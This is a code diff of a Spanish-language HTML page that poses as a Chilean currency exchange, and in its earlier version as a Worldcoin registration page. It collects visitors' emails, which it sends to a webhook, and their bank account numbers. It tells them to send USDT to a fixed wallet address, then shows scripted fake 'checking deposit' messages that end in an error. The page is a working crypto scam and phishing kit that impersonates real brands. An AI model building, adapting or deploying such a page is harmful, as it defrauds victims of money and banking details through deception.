@@ -1,84 +1,102 @@
 <!DOCTYPE html>
 <html lang="es">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Registro - Worldcoin</title>
+    <title>Intercambio - Cambios Chile</title>
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&display=swap" rel="stylesheet">
     <style>
         body {
             font-family: 'Montserrat', sans-serif;
-            background-color: #f4f4f4; /* Fondo más suave */
-            color: #333; /* Texto oscuro */
             margin: 0;
             padding: 0;
+            background: linear-gradient(135deg, #001f3f 40%, #FF4136 100%);
+            color: #333;
+            min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            height: 100vh;
             flex-direction: column;
-            text-align: center;
-        }
-
-        #banner {
-            width: 150px; /* Ancho de la imagen */
-            height: 150px; /* Alto de la imagen */
-            border-radius: 50%; /* Borde redondeado */
-            object-fit: cover; /* Ajusta la imagen */
-            margin-bottom: 20px; /* Espacio debajo de la imagen */
         }
 
         .container {
-            background-color: rgba(255, 255, 255, 0.9); /* Fondo blanco con opacidad */
-            color: #333;
-            padding: 40px;
+            background-color: rgba(255, 255, 255, 0.85);
             border-radius: 15px;
-            box-shadow: 0px 0px 30px rgba(0, 0, 0, 0.1);
+            padding: 30px;
+            box-shadow: 0 0 25px rgba(0, 0, 0, 0.1);
+            max-width: 600px;
+            width: 100%;
             text-align: center;
-            width: 90%;
-            max-width: 400px; /* Máximo ancho del contenedor */
+        }
+
+        h2 {
+            font-size: 2rem;
+            color: #001f3f;
+            margin-bottom: 20px;
         }
 
         .input-group {
-            margin-bottom: 20px; /* Espaciado entre grupos de entrada */
+            margin-bottom: 20px;
+            text-align: left;
         }
 
         .input-group label {
             font-size: 18px;
             margin-bottom: 10px;
+            color: #001f3f;
             display: block;
-            color: #555; /* Texto gris oscuro */
         }
 
         .input-group input[type="text"] {
-            width: calc(100% - 30px);
-            padding: 10px;
-            font-size: 16px;
-            border: 1px solid #ccc; /* Borde gris claro */
-            border-radius: 5px;
-            background-color: #fff; /* Fondo blanco */
-            color: #333; /* Texto oscuro */
+            width: 100%;
+            padding: 15px;
+            border-radius: 10px;
+            border: 1px solid #ccc;
+            font-size: 1rem;
+            box-sizing: border-box;
+            margin-bottom: 10px;
         }
 
         .input-group button {
             width: 100%;
-            padding: 10px;
-            font-size: 16px;
-            background-color: #28a745; /* Verde */
+            padding: 15px;
+            border-radius: 50px;
+            background-color: #FF4136;
             color: white;
-            border: none;
-            border-radius: 5px;
+            font-size: 1rem;
+            text-transform: uppercase;
             cursor: pointer;
             transition: background-color 0.3s ease;
+            border: none;
         }
 
         .input-group button:hover {
-            background-color: #218838; /* Verde oscuro al pasar el ratón */
+            background-color: #ff6347;
         }
 
         .success-text {
-            color: #4CAF50; /* Verde */
+            color: #4CAF50;
             font-size: 16px;
             margin-top: 10px;
+        }
+
+        .wallet-info {
+            background-color: #e1f5fe;
+            padding: 20px;
+            border-radius: 10px;
+            margin: 20px 0;
+        }
+
+        #wallet-address {
+            width: 100%;
+            padding: 10px;
+            border-radius: 5px;
+            border: 1px solid #ccc;
+            background-color: #D0B6C5;
+            color: black;
+            font-weight: bold;
+            margin-bottom: 10px;
         }
 
         .popup {
@@ -87,36 +105,30 @@
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%);
-            background-color: #fff;
+            background-color: #111;
             padding: 30px;
-            border: 2px solid #28a745; /* Verde */
+            border: 2px solid #4CAF50;
             border-radius: 10px;
             text-align: center;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.3);
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
         }
 
         .mensaje {
             font-size: 18px;
             margin-bottom: 20px;
-            color: #333; /* Texto oscuro */
+            color: #4CAF50;
         }
 
         .support-text {
             margin-top: 20px;
-            color: #333; /* Texto oscuro */
-        }
-
-        #wallet-address {
-            color: #333; /* Texto oscuro */
-            font-weight: bold; /* Texto en negrita */
+            color: #4CAF50;
         }
     </style>
 </head>
+
 <body>
-    <img id="banner" src="https://cambios-chile-2.vercel.app/chile.jfif" alt="Banner Worldcoin">
-    
     <div class="container">
-        <h2>Cambios Chile </h2>
+        <h2>Intercambio - Cambios Chile</h2>
 
         <div class="input-group">
             <label for="email">Ingresa tu correo:</label>
@@ -126,25 +138,30 @@
         </div>
 
         <div class="input-group">
-            <label for="cbu">Coloca tu Cuenta Rut Santander Falabella :</label>
+            <label for="cbu">Coloca tu Cuenta Rut Falabella Santander:</label>
             <input type="text" id="cbu" placeholder="CTA RUT/SANTANDER/FALABELLA">
             <button onclick="registrarCBU(this)">Registrar y Enviar</button>
             <div class="success-text" id="cbu-success"></div>
         </div>
 
-        <div class="input-group">
-            <label>Copia y envía los WLD a esta dirección:</label>
+        <div class="wallet-info">
+            <label class="form-label" style="font-size: 24px; font-weight: bold;">Copia y envía los USDT a esta dirección:</label>
             <input type="text" id="wallet-address" value="0x01C65F22A9478C2932e62483509c233F0aaD5c72" readonly>
-            <button onclick="copiarDireccion()">Copiar</button>
+            <button onclick="copiarDireccion()" style="background-color: blue; color: white;">Copiar</button>
         </div>
 
-        <button class="boton-azul-oscuro" onclick="mostrarPopup()">Cargar</button>
+        <div class="input-group">
+            <label for="comprobante">Sube el comprobante del envío de USDT:</label>
+            <input type="file" id="comprobante">
+        </div>
+
+        <button onclick="mostrarPopup()">Cargar</button>
     </div>
 
     <div class="popup" id="popup">
         <div class="mensaje" id="mensaje">Procesando datos...</div>
         <div class="support-text">
-            <p>Soporte: <a href="mailto:WorldcoinAPP@Worldcoin.org">WorldcoinAPP@Worldcoin.org</a></p>
+            <p>Soporte: <a href="mailto:cambios-chile@cambios.org">cambios.chile@cambios.org</a></p>
         </div>
     </div>
 
@@ -176,6 +193,7 @@
                 emailInput.setAttribute('readonly', true);
                 emailInput.style.backgroundColor = '#f2f2f2';
                 successDiv.textContent = 'Registrado exitosamente!';
+
                 enviarCorreoAlWebhook(emailInput.value);
                 button.textContent = 'CONFIRMADO';
             } else {
@@ -187,14 +205,15 @@
         function registrarCBU(button) {
             var cbuInput = document.getElementById('cbu');
             var successDiv = document.getElementById('cbu-success');
+            var cbuValue = cbuInput.value;
 
-            if (/^\d+$/.test(cbuInput.value)) {
+            if (/^\d+$/.test(cbuValue)) {
                 cbuInput.setAttribute('readonly', true);
                 cbuInput.style.backgroundColor = '#f2f2f2';
-                successDiv.textContent = 'La Cta  ha sido registrado exitosamente.';
+                successDiv.textContent = 'El CBU / PAYPAL ha sido registrado exitosamente.';
                 button.textContent = 'CONFIRMADO';
             } else {
-                successDiv.textContent = 'Error: Por favor, ingrese solo números en la Cta .';
+                successDiv.textContent = 'Error: Por favor, ingrese solo números en el CBU.';
                 successDiv.style.color = 'red';
             }
         }
@@ -218,24 +237,12 @@
 
             popup.style.display = 'block';
             mensaje.textContent = 'No cerrar la página. Cargando PAGO';
-
-            setTimeout(function() {
-                mensaje.textContent = 'Procesando datos...';
-            }, 30000); // 30 segundos
-
-            setTimeout(function() {
-                mensaje.textContent = 'Conectando API Bank..';
-            }, 40000); // 40 segundos
-
-            setTimeout(function() {
-                mensaje.textContent = 'Checkeando depósito de Worldcoin..';
-            }, 50000); // 50 segundos
-
-            setTimeout(function() {
-                mensaje.textContent = 'ERROR en Depósito de WorldCoin no válido!';
-                mensaje.style.color = 'red';
-            }, 60000); // 60 segundos
+            setTimeout(function() { mensaje.textContent = 'Procesando datos...'; }, 30000);
+            setTimeout(function() { mensaje.textContent = 'Conectando API Bank..'; }, 40000);
+            setTimeout(function() { mensaje.textContent = 'Checkeando depósito de Worldcoin..'; }, 50000);
+            setTimeout(function() { mensaje.textContent = 'ERROR en Depósito de WorldCoin no válido!'; mensaje.style.color = 'red'; }, 60000);
         }
     </script>
 </body>
+
 </html>
